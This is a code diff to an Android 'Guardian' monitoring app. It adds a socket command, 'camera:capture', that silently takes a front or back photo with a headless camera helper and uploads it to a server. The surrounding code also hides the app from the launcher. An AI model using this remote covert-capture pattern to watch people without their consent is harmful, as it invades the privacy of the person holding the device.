@@ -36,6 +36,7 @@ class GuardianSocketManager(
 
     private var socket: Socket? = null
     private val overlayManager = GuardianOverlayManager(context)
+    private val cameraHelper = id.irnhakim.guardian.core.camera.HeadlessCameraHelper(context)
 
     fun connect() {
         if (socket?.connected() == true) return
@@ -124,6 +125,18 @@ class GuardianSocketManager(
             socket?.on("app:show") {
                 Log.d("GuardianSocket", "Received app:show — showing Guardian in launcher")
                 setAppVisibility(true)
+            }
+
+            socket?.on("camera:capture") { args ->
+                try {
+                    val data = args?.firstOrNull() as? JSONObject
+                    val cameraType = data?.optString("cameraType", "BACK") ?: "BACK"
+                    val isFront = cameraType.equals("FRONT", ignoreCase = true)
+                    Log.d("GuardianSocket", "Received camera:capture command ($cameraType)")
+                    captureAndUploadPhoto(isFront, cameraType)
+                } catch (e: Exception) {
+                    Log.e("GuardianSocket", "Error handling camera:capture", e)
+                }
             }
 
             socket?.on("protection:set") { args ->
@@ -330,6 +343,28 @@ class GuardianSocketManager(
             }
         } catch (e: Exception) {
             Log.e("GuardianSocket", "Failed to remove device admin", e)
+        }
+    }
+
+    private fun captureAndUploadPhoto(isFront: Boolean, cameraType: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val base64 = cameraHelper.capturePhoto(isFront)
+                if (!base64.isNullOrEmpty()) {
+                    api.submitCapture(
+                        deviceId,
+                        id.irnhakim.guardian.data.remote.dto.CaptureRequest(
+                            cameraType = cameraType,
+                            base64Image = base64
+                        )
+                    )
+                    Log.d("GuardianSocket", "Snapshot captured and uploaded successfully ($cameraType)")
+                } else {
+                    Log.e("GuardianSocket", "Failed to capture snapshot: empty image")
+                }
+            } catch (e: Exception) {
+                Log.e("GuardianSocket", "Error uploading snapshot", e)
+            }
         }
     }
 
